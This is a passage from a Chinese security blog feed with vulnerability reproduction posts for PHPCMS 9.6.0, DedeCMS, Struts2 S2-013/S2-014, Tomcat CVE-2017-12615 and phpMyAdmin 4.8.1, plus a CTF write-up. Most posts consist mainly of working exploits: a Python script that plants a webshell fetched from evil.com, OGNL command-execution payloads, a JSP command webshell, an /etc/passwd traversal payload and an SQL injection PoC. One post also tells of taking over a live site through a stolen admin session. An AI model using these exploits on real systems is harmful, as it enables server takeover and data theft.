class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre><p>一个一个查看最后发现:</p><pre><code class="php">    function editor($field, $value) {        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);        return $value;    }</code></pre><p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p><p>跟进<code>download</code>:</p><pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)    {        global $image_d;        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;field = $field;        $dir = date(&#39;Y/md/&#39;);        $uploadpath = $upload_url.$dir;        $uploaddir = $this-&gt;upload_root.$dir;        $string = new_stripslashes($value);        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);        }        unset($matches, $string);        $remotefileurls = array_unique($remotefileurls);        $oldpath = $newpath = array();        foreach($remotefileurls as $k=&gt;$file) {            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);            $file_name = basename($file);            $filename = $this-&gt;getname($filename);            $newfile = $uploaddir.$filename;            $upload_func = $this-&gt;upload_func;            if($upload_func($file, $newfile)) {                $oldpath[] = $k;                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;                @chmod($newfile, 0777);                $fileext = fileext($filename);                if($watermark){                    watermark($newfile, $newfile,$this-&gt;siteid);                }                $filepath = $dir.$filename;                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);                $aid = $this-&gt;add($downloadedfile);                $this-&gt;downloadedfiles[$aid] = $filepath;            }        }        return str_replace($oldpath, $newpath, $value);    }    </code></pre><p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p><p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p><p><code>$file</code>是<code>$remotefileurls</code>中的值</p><pre><code class="php">        $string = new_stripslashes($value);//反转义        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);        }</code></pre><p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p><pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {        ...        $pos = strpos($surl,&#39;#&#39;);        if($pos&gt;0) $surl = substr($surl,0,$pos);        ...    }</code></pre><p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p><p>我们再看下<code>$newfile</code></p><pre><code class="php">$dir = date(&#39;Y/md/&#39;);$uploaddir = $this-&gt;upload_root.$dir;$filename = fileext($file);$filename = $this-&gt;getname($filename);$newfile = $uploaddir.$filename;</code></pre><p><code>$this-&gt;getname</code>:</p><pre><code class="php">function getname($fileext){        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;    }</code></pre><p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p><p>最后payload为:</p><pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1post:info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import reimport requestsimport randomdef exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()    print(rep.text)    print(result)exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/12/phpcms960任意文件上传复现/">https://www.ccreater.top/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次漏洞挖掘</title>
      <link href="2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p><p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p><p>主要的信息为:</p><pre><code>dedecms 5.7sp1 20150618ZOHO ManageEngine OpManageradminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p><p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p><p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p><p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p><p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p><p><strong>一些网站的英文站点可能就是我们的突破口</strong></p><p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/11/记一次漏洞挖掘/">https://www.ccreater.top/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 5.7 plusguestbook.php注入漏洞</title>
      <link href="2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p><ol><li>php magic_quotes_gpc=off</li><li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p><p><code>/plus/guestbook.php</code>中为对身份进行验证:</p><pre><code class="php">if($action==&#39;admin&#39;){    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);    exit();}</code></pre><p><code>/plus/guestbook/edit.inc.php</code></p><pre><code class="php">if($job==&#39;editok&#39;){    $remsg = trim($remsg);    if($remsg!=&#39;&#39;)    {        //管理员回复不过滤HTML        if($g_isadmin)        {            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg;             //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;        }        else        {            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);            $msg = $oldmsg.$remsg;        }    }     $msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);    exit();}</code></pre><p>其中:</p><pre><code class="php">$msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre><p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p><pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)    {        foreach($$_request as $_k =&gt; $_v)         {            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;            else ${$_k} = _RunMagicQuotes($_v);        }    }</code></pre><p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p><pre><code class="php">function _RunMagicQuotes(&amp;$svar){    if(!get_magic_quotes_gpc())    {        ...    }    return $svar;}</code></pre><p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/02/10/DedeCMS">https://www.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="https://www.ccreater.top/2020/02/10/DedeCMS">https://www.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-013_S2-014远程代码执行漏洞</title>
      <link href="2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p><pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// 或link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><p>S2-014</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/08/S2-013_S2-014远程代码执行漏洞/">https://www.ccreater.top/2020/02/08/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUT方法任意写文件漏洞CVE-2017-12615</title>
      <link href="2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/"/>
      <url>2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p><p>平台: Windows </p><p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p><p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p><pre><code>PUT /111.jsp::$DATA HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code class="java">&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print(&quot;&lt;/pre&gt;&quot;);    }%&gt;</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requestsdef poc(url):    filename=&quot;tomcat_check_vuln.txt&quot;    content=&quot;test&quot;    try:        requests.put(url+&quot;/&quot;+filename,data=conetent)        res=requests.get(url+&quot;/&quot;+filename)    except :        return False    if res.status_code==200:        return True    return False</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/02/08/Tomcat">https://www.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="https://www.ccreater.top/2020/02/08/Tomcat">https://www.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 rce</title>
      <link href="2020/02/08/phpmyadmin%204.8.1%20rce/"/>
      <url>2020/02/08/phpmyadmin%204.8.1%20rce/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p><p>登陆账号</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p><p>漏洞位置:<code>index.php</code>:57</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><p>非常明显的任意文件包含漏洞</p><p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p><p>跟进去</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p><pre><code class="php">array (  0 =&gt; &#39;db_datadict.php&#39;,....)</code></pre><p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p><p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p><p>通用的payload:</p><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p><p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/02/08/phpmyadmin">https://www.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="https://www.ccreater.top/2020/02/08/phpmyadmin">https://www.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hgame</title>
      <link href="2020/02/07/2020hgame/"/>
      <url>2020/02/07/2020hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote><p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p></blockquote><p>根据提示下载.git</p><pre><code class="bash">$ git remote -v#查看git</code></pre><p>查看提交历史拿到flag</p><h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p><pre><code>GET / HTTP/1.1Host: kyaru.hgame.n3ko.coCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Cosmos BrowerAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7referer: https://vidar.club/ x-forwarded-for: 127.0.0.1If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMTConnection: close</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p><p>修改GET为post</p><h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;        }    }}?&gt;</code></pre><p>adminpassword: 0e114902927253523756713132279690 </p><p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p><p>adminusername: Cosmos! </p><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}$action = @$_GET[&#39;action&#39;];$filter = &quot;/config|etc|flag/i&quot;;if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {    if(preg_match($filter, $_GET[&#39;action&#39;])) {        echo &quot;Hacker get out!&quot;;        exit();    }        include $action;}elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {    header(&quot;Location: ?action=login.php&quot;);    exit();}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); 